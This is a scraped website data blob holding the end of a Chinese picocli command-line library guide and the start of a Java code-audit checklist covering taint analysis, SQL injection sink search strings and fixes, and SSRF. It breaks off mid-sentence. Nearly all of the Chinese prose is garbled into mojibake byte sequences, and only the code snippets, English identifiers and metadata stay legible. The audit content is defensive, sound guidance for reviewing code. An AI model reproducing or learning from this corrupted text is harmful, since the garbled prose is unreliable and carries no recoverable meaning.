³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåçéèå­å½ä»¤é¨åã\n\n# å¸®å©å­å½ä»¤\n\npicocliæä¸ä¸ªåç½®çå¸®å©å­å½ä»¤ï¼ä½å¦ææ¨æå´è¶£åå»ºèªå®ä¹å¸®å©å½ä»¤ï¼è¯·åéç¨æ·æåçå¸®å©å­å½ä»¤é¨åã\n\n\n# éå¤ä½¿ç¨\n\næ¨å¯è½ä¼åç°èªå·±å¨è®¸å¤å½ä»¤è¡åºç¨ç¨åºä¸­å®ä¹äºç¸åçéé¡¹ãåæ°æå½ä»¤å±æ§ãä¸ºäºåå°éå¤ï¼picocliæ¯æå­ç±»åæ··åï¼ä½ä¸ºéç¨æ­¤ç±»éé¡¹åå±æ§çæ¹æ³ã\n\néç¨ä¸è¿°éé¡¹åå±æ§çä¸ç§æ¹æ³æ¯æ©å±ç±»ãpicocliå°èµ°å¨ç±»å±æ¬¡ç»æä¸­æ£æ¥æ³¨éï¼å æ­¤å¨è¶ç±»ä¸å£°æç@optionsã@parameterså@commandå±æ§å¨ææå­ç±»ä¸­é½å¯ç¨ã\n\nå½ä»¤ä¹å¯ä»¥éè¿ç¨@mixinæ³¨éå­æ®µæ¥åå«mixinãmixinç±»ä¸­åç°çææpicocliæ³¨éé½æ·»å å°å¸¦æ@mixinæ³¨éå­æ®µçå½ä»¤ä¸­ãä¾å¦ï¼\n\n@command(name = "zip", description = "example reuse with @mixin annotation.")\npublic class mycommand {\n\n    // adds the options defined in reusableoptions to this command\n    @mixin\n    private reusableoptions mymixin;\n    ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nç¨æ·æåçéç¨é¨åææ´å¹¿æ³çç¤ºä¾ã\n\n\n# æ§è¡å½ä»¤\n\næ§è¡å½ä»¤æ¶ï¼è§£æå½ä»¤è¡æ¯ç¬¬ä¸æ­¥ãä¸ä¸ªå¼ºå¤§çç°å®ä¸çåºç¨ç¨åºéè¦å¤çè®¸å¤åºæ¯ï¼\n\n * ç¨æ·è¾å¥æ æï¼æ¾ç¤ºæè¿°é®é¢çéè¯¯ï¼å¹¶æ¾ç¤ºä½¿ç¨å¸®å©\n\n * ç¨æ·è¯·æ±çä½¿ç¨å¸®å©ï¼æ¾ç¤ºå¸®å©æ¶æ¯å¹¶éåº\n\n * ç¨æ·è¯·æ±ççæ¬å¸®å©ï¼æ¾ç¤ºçæ¬ä¿¡æ¯åéåº\n\n * ä»¥ä¸é½ä¸æ¯ï¼è¿è¡ä¸å¡é»è¾ï¼å¯è½ç¨äºå­å½ä»¤ï¼\n\n * ä¸å¡é»è¾å¯è½ä¼æåºå¼å¸¸ï¼å¤çæéæ°æåºå¼å¸¸\n\nä»piocli 4.0èµ·ï¼æ¨å¯ä»¥ä½¿ç¨commandline.executeæ¹æ³ï¼è¯¥æ¹æ³å¨ä¸è¡ä»£ç ä¸­å¤çä¸è¿°ææåºæ¯ï¼\n\nnew commandline(new myapp()).execute(args);\n\n\n1\n\n\nä½¿ç¨æ§è¡æ¹æ³ï¼åºç¨ç¨åºä»£ç å¯ä»¥éå¸¸ç´§åï¼\n\n@command(name = "myapp", mixinstandardhelpoptions = true, version = "1.0")\nclass myapp implements callable<integer> {\n\n    @option(names = "-x") int x;\n\n    @override\n    public integer call() { // business logic\n        system.out.printf("x=%s%n", x);\n        return 123; // exit code\n    }\n\n    public static void main(string... args) { // bootstrap the application\n        system.exit(new commandline(new myapp()).execute(args));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå°½ç®¡åªæ15è¡é¿ï¼ä½è¿æ¯ä¸ä¸ªæççåºç¨ç¨åºï¼é¤äº-xéé¡¹å¤ï¼è¿æ--helpå--versionéé¡¹ãå¦æç¨æ·è¦æ±ï¼æ§è¡æ¹æ³å°æ¾ç¤ºä½¿ç¨å¸®å©æçæ¬ä¿¡æ¯ï¼æ æçç¨æ·è¾å¥å°å¯¼è´æç¨çéè¯¯æ¶æ¯ãå¦æç¨æ·è¾å¥ææï¼åè°ç¨ä¸å¡é»è¾ãæåï¼æ§è¡æ¹æ³è¿åä¸ä¸ªéåºç¶æä»£ç ï¼å¦æéè¦ï¼å¯ç¨äºè°ç¨system.exitã\n\nç¨æ·æåçdiyå½ä»¤æ§è¡é¨åæ¾ç¤ºäºæ§è¡æ¹æ³å¯ä»¥çç¥çæ ·æ¿ä»£ç ç¤ºä¾ã\n\n\n# éåºä»£ç \n\nè®¸å¤å½ä»¤è¡åºç¨ç¨åºè¿åéåºä»£ç ï¼ä»¥è¡¨ç¤ºæåæå¤±è´¥ãé¶éå¸¸æå³çæåï¼éé¶éåºä»£ç éå¸¸ç¨äºéè¯¯ï¼ä½é¤æ­¤ä¹å¤ï¼æ¯ä¸ªåºç¨ç¨åºçå«ä¹ä¸åã\n\npicocli 4.0ä¸­å¼å¥çcommandline.executeæ¹æ³è¿åä¸ä¸ªintï¼å¦æéè¦ï¼åºç¨ç¨åºå¯ä»¥ä½¿ç¨æ­¤è¿åå¼è°ç¨system.exitãä¾å¦ï¼\n\npublic static void main(string... args) {\n  int exitcode = new commandline(new myapp()).execute(args);\n  system.exit(exitcode);\n}\n\n\n1\n2\n3\n4\n\n\n> æ§çæ¬çpicocliæä¸äºæéçéåºä»£ç æ¯æï¼picocliä¼è°ç¨system.exitï¼ä½ç°å¨ä¸å»ºè®®ä½¿ç¨ã\n\n\n# çæéåºä»£ç \n\nå®ç°callableå¹¶ä¸æ·»å äº@commandæ³¨è§£çæ¹æ³å@commandæ³¨è§£çç±»å¯ä»¥ç®åå°è¿åintææ´æ°ï¼æ­¤å¼å°ä»commandline.executeè¿åãä¾å¦ï¼\n\n@command(name = "greet")\nclass greet implements callable<integer> {\n    public integer call() {\n        system.out.println("hi");\n        return 1;\n    }\n\n    // define a "shout" subcommand with a @command-annotated method\n    @command\n    int shout() {\n        system.out.println("hi!");\n        return 2;\n    }\n}\n\nassert 1 == new commandline(new greet()).execute();\nassert 2 == new commandline(new greet()).execute("shout");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nä½¿ç¨å®ç°runnableçç¨æ·å¯¹è±¡çå½ä»¤å¯ä»¥å®ç°iexitcodegeneratoræ¥å£æ¥çæéåºä»£ç ã\n\n\n# ä¾å¤éåºä»£ç \n\né»è®¤æåµä¸ï¼æ§è¡æ¹æ³æåæ¶è¿åcommandline.exitcode.ok (0)ï¼å¨runableãcallableæå½ä»¤æ¹æ³ä¸­åçå¼å¸¸æ¶è¿åcommandline.exitcode.softwareï¼1ï¼ï¼ä»¥åæ æè¾å¥çcommandline.exitcode.usageï¼2ï¼ãï¼æ ¹æ®è¿ä¸ªstackoverflowç­æ¡ï¼è¿äºæ¯å¸¸è§çå¼ï¼ãè¿å¯ä»¥éè¿@commandæ³¨éè¿è¡èªå®ä¹ãä¾å¦ï¼\n\n@command(exitcodeoninvalidinput = 123,\n   exitcodeonexecutionexception = 456)\n\n\n1\n2\n\n\næ­¤å¤ï¼åºç¨ç¨åºå¯ä»¥éç½®iexitcodeexceptionmapperå°ç¹å®å¼å¸¸æ å°å°éåºä»£ç ã\n\n\n# æ§è¡éç½®\n\nè½ç¶æ§è¡æ¹æ³åè®¸å¨ä¸è¡ä»£ç ä¸­è¿è¡cliåºç¨ç¨åºï¼ä½å½ä»¤æ§è¡çåä¸ªæ­¥éª¤é½æ¯é«åº¦å¯éç½®çãä»¥ä¸æ¹æ³å¯ç¨äºéç½®æ§è¡æ¹æ³çè¡ä¸ºï¼æ¨å¯ä»¥ä½¿ç¨å®ä»¬æ¥è°æ´å½ä»¤æ§è¡ä»¥æ»¡è¶³æ¨çéæ±ï¼\n\n * get/setout\n * get/seterr\n * get/setcolorscheme\n * get/setexecutionstrategy\n * get/setparameterexceptionhandler\n * get/setexecutionexceptionhandler\n * get/setexitcodeexceptionmapper\n\n> ä¸è¿°æ¹æ³ä¸éç¨äºï¼å¹¶è¢«å¿½ç¥ï¼å¶ä»å¥å£ç¹ï¼å¦parseãparseargsãpopulatecommandãrunãcallãè°ç¨ãparsewithhandleråparsewithhandlersã\n\n\n# å¤çéè¯¯\n\nå¨åé¨ï¼æ§è¡æ¹æ³è§£ææå®çç¨æ·è¾å¥ï¼å¹¶å¡«åæ³¨éå®ä¹çéé¡¹åä½ç½®åæ°ãå½ç¨æ·æå®æ æè¾å¥æ¶ï¼ç±iparameterexceptionhandlerå¤çã\n\nè§£æç¨æ·è¾å¥åï¼å°è°ç¨å½ä»¤çä¸å¡é»è¾ï¼è¿è¡ãè°ç¨æ@command-annotatedæ¹æ³ãå½ä¸å¡é»è¾æåºå¼å¸¸æ¶ï¼ç±iexecutionexceptionhandlerå¤çã\n\nå¨å¤§å¤æ°æåµä¸ï¼é»è®¤å¤çç¨åºå°±è¶³å¤äºãå¨ç¨æ·æåçå¤çéè¯¯é¨åæ·±å¥è§£éäºé»è®¤å¤çç¨åºçèªå®ä¹ã\n\n\n# è¿ç§»\n\næ§çæ¬çpicocliæ¯æè¿è¡ãè°ç¨ãè°ç¨åparsewithhandlersæ¹ä¾¿æ¹æ³ï¼è¿äºæ¹æ³ç±»ä¼¼äºæ§è¡ï¼ä½å¯¹è§£æå¨éç½®çæ¯ææéï¼å¯¹éåºä»£ç çæ¯ææéãä»picocli 4.0ä¸­ï¼è¿äºæ¹æ³å·²è¢«å¼ç¨ã\n\nç¨æ·æåçè¿ç§»é¨åå¯å¸®å©æ¨å°ç°æä»£ç è¿ç§»å°æ°å¼å¥çæ§è¡api\n\n\n# è¿½è¸ª\n\npicocliæ¯æè§£æå¨è·è¸ªï¼ä»¥æ¹ä¾¿æéæé¤ãç³»ç»å±æ§picocli.traceæ§å¶è·è¸ªçº§å«ãæ¯æççº§å«åæ¬offãwarnãinfoådebugãé»è®¤è·è¸ªçº§å«ä¸ºwarnã\n\næå®æ²¡æå¼çç³»ç»å±æ§-dpicocli.traceå°æè·è¸ªçº§å«è®¾ç½®ä¸ºinfoã\n\n * debugï¼æ¾ç¤ºè§£æå¨å¨å½ä»¤è¡è§£ææé´æä½å³å®çè¯¦ç»ä¿¡æ¯ã\n\n * infoï¼æ¾ç¤ºå½ä»¤è¡è§£ææé´åççäºæçé«çº§æ¦è¿°ã\n\n * warnï¼é»è®¤å¼ãå¯ç¨å®½æ¾è§£ææ¶æ¾ç¤ºè­¦åèä¸æ¯éè¯¯ï¼å½å¤æ¬¡æå®åå¼éé¡¹ï¼commandline.overwrittenoptionsallowedä¸ºçï¼æå½ä»¤è¡åæ°æ æ³å¹éä¸ºéé¡¹æä½ç½®åæ°æ¶ï¼commandline.unmatchedargumentsallowedä¸ºçï¼ã\n\n * offï¼ç¦æ­¢ææè·è¸ªï¼åæ¬è­¦åã\n\nç¤ºä¾ï¼\n\n# create a custom \'mygit\' command that invokes picocli.demo$git with tracing switched on\nalias mygit=\'java -dpicocli.trace -cp picocli-all.jar picocli.demo$git\'\n\n# invoke our command with some parameters\nmygit --git-dir=/home/rpopma/picocli commit -m "fixed typos" -- src1.java src2.java src3.java\n\n\n1\n2\n3\n4\n5\n\n\nè¾åºï¼\n\n[picocli info] parsing 8 command line args [--git-dir=/home/rpopma/picocli, commit, -m, "fixed typos", --, src1.java, src2.java, src3.java]\n[picocli info] setting file field \'git.gitdir\' to \'\\home\\rpopma\\picocli\' for option --git-dir\n[picocli info] adding [fixed typos] to list&lt;string> field \'gitcommit.message\' for option -m\n[picocli info] found end-of-options delimiter \'--\'. treating remainder as positional parameters.\n[picocli info] adding [src1.java] to list&lt;string> field \'gitcommit.files\' for args[0..*]\n[picocli info] adding [src2.java] to list&lt;string> field \'gitcommit.files\' for args[0..*]\n[picocli info] adding [src3.java] to list&lt;string> field \'gitcommit.files\' for args[0..*]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# èªå¨è¡¥å¨\n\nåºäºpicocliçåºç¨ç¨åºç°å¨å¯ä»¥å¨bashæzsh unix shellä¸­å®æå½ä»¤è¡ãè¯·åéjavaå½ä»¤è¡åºç¨ç¨åºèªå¨å®ææåï¼äºè§£å¦ä½çæä¸ºæ¨çåºç¨ç¨åºéèº«å®å¶çèªå¨å®æèæ¬ã\n\n\n# æ´å¤\n\nä¸ºäºä¿ææ¬å¿«éæåç®ç­ï¼æè³å°ç®ç­ï¼ï¼å¿é¡»éæ¼ä¸äºä¸è¥¿ãå¦ææ¨æå´è¶£ï¼è¿éæä¸äºå¿«éé¾æ¥ï¼\n\n * picocli in other languages\n * usage help api for customizing the usage help message layout\n * tips & tricks\n * api javadoc',charsets:{cjk:!0},lastUpdated:"2022/04/25, 19:19:43",lastUpdatedTimestamp:1650914383e3},{title:"Javaä»£ç å®¡è®¡CheckList",frontmatter:{title:"Javaä»£ç å®¡è®¡CheckList",date:"2022-07-26T15:00:00.000Z",permalink:"/sec/codereview/javachecklist",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["ä»£ç å®¡è®¡"],tags:["Java","ä»£ç å®¡è®¡"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/204.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/00.Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1CheckList.html",relativePath:"02.å®å¨/204.ä»£ç å®¡è®¡/00.Javaä»£ç å®¡è®¡CheckList.md",key:"v-49770e72",path:"/sec/codereview/javachecklist/",headers:[{level:2,title:"æ¦è¿°",slug:"æ¦è¿°",normalizedTitle:"æ¦è¿°",charIndex:25},{level:3,title:"ä»ä¹æ¯ä»£ç å®¡è®¡ï¼",slug:"ä»ä¹æ¯ä»£ç å®¡è®¡",normalizedTitle:"ä»ä¹æ¯ä»£ç å®¡è®¡ï¼",charIndex:32},{level:3,title:"æ±¡ç¹åæåç",slug:"æ±¡ç¹åæåç",normalizedTitle:"æ±¡ç¹åæåç",charIndex:160},{level:3,title:"ä»£ç å®¡è®¡æµç¨",slug:"ä»£ç å®¡è®¡æµç¨",normalizedTitle:"ä»£ç å®¡è®¡æµç¨",charIndex:874},{level:3,title:"å¸¸ç¨å·¥å·",slug:"å¸¸ç¨å·¥å·",normalizedTitle:"å¸¸ç¨å·¥å·",charIndex:1358},{level:2,title:"åºç¡æ¼æ´å®¡è®¡æ¹å¼",slug:"åºç¡æ¼æ´å®¡è®¡æ¹å¼",normalizedTitle:"åºç¡æ¼æ´å®¡è®¡æ¹å¼",charIndex:1578},{level:3,title:"SQLæ³¨å¥",slug:"sqlæ³¨å¥",normalizedTitle:"sqlæ³¨å¥",charIndex:289},{level:3,title:"SSRF",slug:"ssrf",normalizedTitle:"ssrf",charIndex:2372},{level:3,title:"XXE",slug:"xxe",normalizedTitle:"xxe",charIndex:3109},{level:3,title:"æç´¢å­ç¬¦ä¸²åå®¹",slug:"æç´¢å­ç¬¦ä¸²åå®¹-3",normalizedTitle:"æç´¢å­ç¬¦ä¸²åå®¹",charIndex:1718},{level:3,title:"ä»»ææä»¶æä½",slug:"ä»»ææä»¶æä½",normalizedTitle:"ä»»ææä»¶æä½",charIndex:6363},{level:3,title:"å½ä»¤æ§è¡",slug:"å½ä»¤æ§è¡",normalizedTitle:"å½ä»¤æ§è¡",charIndex:7417},{level:3,title:"ä¸å®å¨çååºåå",slug:"ä¸å®å¨çååºåå",normalizedTitle:"ä¸å®å¨çååºåå",charIndex:7870},{level:3,title:"URLè·³è½¬",slug:"urlè·³è½¬",normalizedTitle:"urlè·³è½¬",charIndex:8284},{level:3,title:"ç¡¬ç¼ç ",slug:"ç¡¬ç¼ç ",normalizedTitle:"ç¡¬ç¼ç ",charIndex:8742},{level:3,title:"ä¸å®å¨çå å¯æ¹å¼",slug:"ä¸å®å¨çå å¯æ¹å¼",normalizedTitle:"ä¸å®å¨çå å¯æ¹å¼",charIndex:9036},{level:3,title:"æ¥å¿ä¼ªé ",slug:"æ¥å¿ä¼ªé ",normalizedTitle:"æ¥å¿ä¼ªé ",charIndex:9562},{level:3,title:"ææä¿¡æ¯æ³é²",slug:"ææä¿¡æ¯æ³é²",normalizedTitle:"ææä¿¡æ¯æ³é²",charIndex:9776},{level:3,title:"å®å¨éç½®éè¯¯",slug:"å®å¨éç½®éè¯¯",normalizedTitle:"å®å¨éç½®éè¯¯",charIndex:10218},{level:3,title:"XSS",slug:"xss",normalizedTitle:"xss",charIndex:825},{level:2,title:"ä¸å¡é»è¾æ¼æ´å®¡è®¡æ¹å¼",slug:"ä¸å¡é»è¾æ¼æ´å®¡è®¡æ¹å¼",normalizedTitle:"ä¸å¡é»è¾æ¼æ´å®¡è®¡æ¹å¼",charIndex:10854},{level:3,title:"è®¤è¯ç¸å³",slug:"è®¤è¯ç¸å³",normalizedTitle:"è®¤è¯ç¸å³",charIndex:10948},{level:3,title:"æ¯ä»ç¸å³",slug:"æ¯ä»ç¸å³",normalizedTitle:"æ¯ä»ç¸å³",charIndex:14347},{level:3,title:"æéç¸å³",slug:"æéç¸å³",normalizedTitle:"æéç¸å³",charIndex:14748},{level:3,title:"éçé®é¢",slug:"éçé®é¢",normalizedTitle:"éçé®é¢",charIndex:15184},{level:3,title:"éªè¯ç ç±»",slug:"éªè¯ç ç±»",normalizedTitle:"éªè¯ç ç±»",charIndex:15521},{level:2,title:"ä¸æ¹ç»ä»¶æ¼æ´å®¡è®¡æ¹å¼",slug:"ä¸æ¹ç»ä»¶æ¼æ´å®¡è®¡æ¹å¼",normalizedTitle:"ä¸æ¹ç»ä»¶æ¼æ´å®¡è®¡æ¹å¼",charIndex:15795},{level:2,title:"åèèµæ",slug:"åèèµæ",normalizedTitle:"åèèµæ",charIndex:16156}],excerpt:"<p>å¥½ä¹æ²¡æ´æ°äºï¼åä¸ç¯CheckListã</p>\n",headersStr:"æ¦è¿° ä»ä¹æ¯ä»£ç å®¡è®¡ï¼ æ±¡ç¹åæåç ä»£ç å®¡è®¡æµç¨ å¸¸ç¨å·¥å· åºç¡æ¼æ´å®¡è®¡æ¹å¼ SQLæ³¨å¥ SSRF XXE æç´¢å­ç¬¦ä¸²åå®¹ ä»»ææä»¶æä½ å½ä»¤æ§è¡ ä¸å®å¨çååºåå URLè·³è½¬ ç¡¬ç¼ç  ä¸å®å¨çå å¯æ¹å¼ æ¥å¿ä¼ªé  ææä¿¡æ¯æ³é² å®å¨éç½®éè¯¯ XSS ä¸å¡é»è¾æ¼æ´å®¡è®¡æ¹å¼ è®¤è¯ç¸å³ æ¯ä»ç¸å³ æéç¸å³ éçé®é¢ éªè¯ç ç±» ä¸æ¹ç»ä»¶æ¼æ´å®¡è®¡æ¹å¼ åèèµæ",content:'å¥½ä¹æ²¡æ´æ°äºï¼åä¸ç¯CheckListã\n\n\n# æ¦è¿°\n\n\n# ä»ä¹æ¯ä»£ç å®¡è®¡ï¼\n\nè°ï¼ä»£ç å®¡è®¡å¼å¾æ¯å·æå®å¨åå¼åç»éªçäººå\n\nå¯¹è±¡ï¼éè¯»ç¨åºæºä»£ç æèç»è¿åç¼è¯ä¹åçä»£ç \n\nææ®µï¼åå©èªå¨åä»£ç åæå·¥å·æèäººå·¥éè¯»çæ¹å¼\n\nç®çï¼åç°ç³»ç»ä»£ç ä¸­å­å¨çå®å¨é£é©åè®¾è®¡ç¼ºé·ï¼å¼å¯¼å¼åäººåä¿®å¤ï¼ä¿éç³»ç»è¿è¡å®å¨ã\n\n\n# æ±¡ç¹åæåç\n\næ±¡ç¹åææ¯ä¸ç§è·è¸ªå¹¶åææ±¡ç¹ä¿¡æ¯å¨ç¨åºä¸­æµå¨çææ¯ãå¨æ¼æ´åæä¸­éå¸¸å°æ±¡ç¹åææ½è±¡æä¸ä¸ªä¸åç»çè¡¨ç¤ºæ¹å¼<sources,sinks,sanitizers>çå½¢å¼ï¼\n\n * sources: æ±¡ç¹æºï¼ç´æ¥å¼å¥å¯¼è´å±é©åççä¸ä¿¡ä»»æ°æ®çä½ç½®ï¼ä»¥SQLæ³¨å¥ä¸ºä¾ï¼id=1å­å¨SQLæ³¨å¥ï¼æ±¡ç¹æºä¸ºidåæ°ï¼\n * sinks: æ±¡ç¹æ±èç¹ï¼ç´æ¥è¿è¡å±é©æä½æèéç§æ³é²å°å¤ççä½ç½®ï¼ä»¥SQLæ³¨å¥ä¸ºä¾ï¼æ±¡ææ±èç¹ä¸ºexecuteQuery()ç¸å³è°ç¨æ§è¡SQLè¯­å¥çä½ç½®ï¼\n * sanitizers: æ å®³åå¤çï¼ä½¿ç¨è½¬ä¹ãè¿æ»¤ãé»æ­ãå å¯ç­ææ®µä¸åå¯¹ç³»ç»å®å¨äº§çå±å®³çä½ç½®ï¼ä»¥SQLæ³¨å¥ä¸ºä¾ï¼æ å®³åå¤çæçæ¯SQLè¯­å¥çè¿æ»¤ä½ç½®ãæèSQLè¯­å¥äº§çç»æçå¤æ­ä½ç½®ï¼ä¸å®å¨ï¼ã\n\n\n\næ±¡ç¹åæå°±æ¯åæç¨åºä¸­æ¯å¦å­å¨æªç»è¿æ å®³åå¤ççæ±¡ææºéè¿ä¼ æ­è·¯å¾å°è¾¾æ±¡ç¹æ±èç¹ï¼å¯¹ç³»ç»äº§çå±å®³ãæ±¡ç¹åæå¯ä»¥åæä»¥ä¸çå ä¸ªé¶æ®µï¼\n\n 1. å¤æ­åä¸¾æ±¡ç¹æ±èç¹ï¼\n 2. å¯»æ¾å°æ±¡ææ±èç¹å¯¹åºåæ°çæ±¡ç¹æ¥æºï¼\n 3. å¤æ­ä»æ±¡ç¹æºå°äºç¹æ±èç¹æ¯å¦å­å¨å¯è½çéè·¯ï¼\n 4. å¤æ­æ¯å¦å­å¨æ å®³åå¤çãæ å®³åå¤çæ¯å¦è½å¤å®å¨å¤çæ±¡ç¹æºæ°æ®çæææåµã\n\næ±¡ç¹åææ¯ä¿¡æ¯æµåæææ¯ä¸­çä¸ç§å®è·µçææ¯ï¼å¹¿æ³åºç¨äºéæåæå®å¨æµè¯ä¸­ï¼æ¯å¯¹äººå·¥ä»£ç å®¡è®¡çä¸ç§æ½è±¡ãå ä¹ææçæ¼æ´é½å¯ä»¥æç§æ±¡ç¹åæçæ¹å¼åç°ï¼ä½æ¯åæçå¤æåº¦å¹¶ä¸ç¸åãå¯¹äºSQLç­å¸¸è§çæ¼æ´ï¼æ±¡ç¹æ±èç¹ï¼å±é©å½æ°ï¼åä¸ä¸å®¹æåç°ï¼ç¸å¯¹æ¥è¯´åæèµ·æ¥æ¯è¾å®¹æï¼ä½æ¯å¯¹äºé»è¾æ¼æ´ãä¿¡æ¯æ³é²ãXSSç­æ¼æ´è¦çèå´å¹¿ãäº§çæåµå¤æãæ²¡æåç¡®çå±é©å½æ°ï¼ç½çåç°è¾ä¸ºå°é¾ä¸åç¡®åº¦ä¸é«ã\n\n\n# ä»£ç å®¡è®¡æµç¨\n\næ©æçä»£ç å®¡è®¡ç±äºç®æ ç³»ç»è§æ¨¡å°ãä»£ç éè¾å°ãä»£ç ä¹é´çé»è¾è°ç¨å³ç³»ç®åæ¸æ°ï¼ä½¿ç¨äººå·¥å®¡è®¡çæ¹å¼å°±å¯ä»¥è¦çæ´ä¸ªç³»ç»äºãäººå·¥ä»£ç å®¡è®¡éå¸¸æä¸ç§æè·¯ï¼\n\n * å¨æéè¯»äºè§£ä»£ç æ¯é¨åçåè½ä»¥åæ°æ®æµåï¼ç»åå·ä½çåè½ç¹åç°ä»£ç ä¸­å­å¨çé®é¢ãè¿ç§æ¹å¼å¨é¢ä½æ¯èæ¶èåï¼\n * å±é©å½æ°å®ä½æ³ï¼éè¿å®ä½ä¸é¢æå°çsinksï¼æ¾å°å±é©å½æ°ä¹ååä¸ææ¥ï¼çå±é©å½æ°æ°æ®æ¥æºï¼æ¯å¦å­å¨æ å®³åå¤çï¼è¿ç§æ¹å¼å¿«æ·æ¹ä¾¿ï¼ä½ä¸å¨é¢ï¼å¯¹é»è¾æ¼æ´æ²¡æåç°çè½åï¼\n * å¯¹å·ä½çåè½ç¹è¿è¡å»ºæ¨¡åå®¡è®¡ï¼æ ¹æ®éæ±ææ¡£æèåä¸çåè½ç¹ï¼åæå¯è½åºç°çé£é©é¡¹ï¼éæ¡ææ¥ãéåº¦è¾å¿«ï¼å¯¹é»è¾æ¼æ´ä¹è½å¾å¥½çææ¡ãææ¥ææåå³äºå®å¨äººåçå¨èå»ºæ¨¡è½ååå¯¹ç®æ çäºè§£ç¨åº¦ã\n\nç±äºç®æ é¡¹ç®å¨åå±çè¿ç¨ä¸­éæ¸å¤æåä»¥åä»£ç éçææ°çº§å¢é¿ï¼ç³»ç»åç³»ç»ä¹é´è°ç¨å³ç³»å¤æï¼äººå·¥å®¡è®¡çæ¹å¼å·²ç»æ æ³åå°å¨é¢çå®¡è®¡ãä¸äºå¯¹åºçå·¥å·ä»å¥ï¼æå¤§çæé«äºä»£ç å®¡è®¡äººåçå·¥ä½æçãéæä»£ç å®¡è®¡å·¥å·åçåå±å¦ä¸ï¼\n\n * å³é®å­çå¹é\n * åºäºASTä»£ç åæ\n * åºäºIR/CFGçä»£ç åæ\n * QLæ¦å¿µ\n\n\n# å¸¸ç¨å·¥å·\n\n * ç¨çé¡ºæçç¼è¾å¨\n   * IDEAãVSCodeãeclipseç­\n * åç¼è¯å·¥å·\n   * Jd-guiãjadxãwJa(æå¨æè°è¯çåè½)ç­\n * èªå¨åä»£ç å®¡è®¡å·¥å·\n   * checkmarxãSeayãFortify SCAãæ¾å«å¥ãCODESECç­\n * å¶ä»\n   * CodeQLãsootãdependencyCheckãysoserialãJNDI-Injection-Exploitç­\n\n\n# åºç¡æ¼æ´å®¡è®¡æ¹å¼\n\n\n# SQLæ³¨å¥\n\n> åçï¼æ»å»èå¨å¯å©ç¨çä½ç½®æå¥æ¶æçSQLè¯­å¥ï¼ä½¿åæ¬çSQLè¯­å¥äº§çæ­§ä¹ï¼ä»èè¾¾å°æ»å»èæçºµæ°æ®åºçç®çã\n\n# ä»£ç æç´¢èå´\n\n*ã*Mapper.xmlã*.javaã*.xml(å°é¨åå¼åäººåMapperæä»¶ç¼åä¸è§è)\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nString sql = "\n@Select\n@Update\n@Delete\n@Insert\n"SELECT\n"UPDATE\n"INSERT\n"DELETE\n${sql}\n${\n.executeQuery(\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å¤æ­ä¾æ®\n\n 1. åçJDBCæ¯å¦å­å¨ç´æ¥æ¼æ¥SQLè¯­å¥ï¼ä½¿ç¨+ï¼æèä½¿ç¨StringBUilder append()ï¼ï¼æªç»è¿é¢ç¼è¯ï¼\n 2. Mybatisä½¿ç¨${}ï¼\n 3. HibernateãJPAé»è®¤æ¯ç»è¿é¢ç¼è¯çï¼ä½æ¯å¦æå¼åèªå·±ç¼åçSQLè¯­å¥ï¼ä¹éè¦è¿è¡æ£æ¥ï¼\n 4. Javaæ¯å¼ºç±»åè¯­è¨ï¼å½æ³¨å¥åæ°ä¸ºlongãintç­æ°å­ç±»åæ¶æ æ³è¿è¡æ³¨å¥ï¼\n 5. æ¾å°å±é©å½æ°ä½ç½®ä¹åï¼åä¸æç´¢ï¼æ¾å½æ°ãæ¹æ³è°ç¨ä½ç½®ï¼ç´å°è¯·æ±å¥å£ï¼controllerå±ï¼ï¼å¤æ­æ¯å¦å­å¨æ å®³åå¤çãæ å®³åå¤çæ¯å¦ä¸¥æ ¼ï¼\n 6. æ³¨æå¼åå¯è½è®¾ç½®å¨å±è¿æ»¤ã\n\n# ä¿®å¤æ¹å¼\n\n 1. åæ°åºå®ä¸ºæ°å­ç±»åæ¶ï¼ä½¿ç¨æ°å­ç±»åæ¥æ¶ï¼æèè½¬ä¸ºæ°å­ç±»åï¼\n 2. é¢ç¼è¯ï¼åçJDBCä½¿ç¨?åæ°å ä½ï¼ä¹åä½¿ç¨.preparedStatementï¼Mybatisä½¿ç¨#{}æ¿æ¢${}ï¼\n 3. å¯¹äºMybatisä¸­æ æ³ä½¿ç¨#{}çåºæ¯ï¼\n    * likeï¼ä½¿ç¨CONCAT(\'%\',#{},\'%\')\n    * inï¼ä½¿ç¨<foreach\n    * order byï¼ä»£ç ä¸åç½åå\n 4. è®¾ç½®è¿æ»¤å¨ï¼ä¸¥æ ¼éå¶ä¼ å¥åæ°\n\n\n# SSRF\n\n> åçï¼SSRF(Server-Side Request Forge, æå¡ç«¯è¯·æ±ä¼ªé )ï¼æ»å»èå©ç¨æ¼æ´è®©æå¡ç«¯åèµ·æå®çè¯·æ±ãSSRFæ»å»çç®æ ä¸è¬æ¯ä»å¤ç½æ æ³è®¿é®çåç½ç³»ç»ã\n> \n> Javaä¸­çSSRFæ¯æçåè®®ï¼httpãhttpsãfileãftpãmailtoãjarãnetãdocãå¨javaä¸­SSRFçå©ç¨å±éè¾å¤§ï¼ä¸è¬å©ç¨httpåè®®æ¥æ¢æµç«¯å£ï¼å©ç¨fileåè®®è¯»åä»»ææä»¶ã\n\n# ä»£ç æç´¢èå´\n\n*ã*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nnew URL(\nURLConnection\nRequest.*.execute\nImageIO.read(\nHttpClient\nClientHttpRequest\nRestTemplate\n.postForObject\n.getForObject\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# å¤æ­ä¾æ®\n\n 1. è¯¥æ¼æ´ç»å¸¸åºç°å¨å®¢æ·ç«¯ä¼ å¥æä»¶ãå¾ççURLå°åï¼éå¸¸å­å¨å¨NASãOSSä¸ï¼éè¿URLè·åç¸å³çæä»¶æèå½åè¯·æ±éè¦è®¿é®å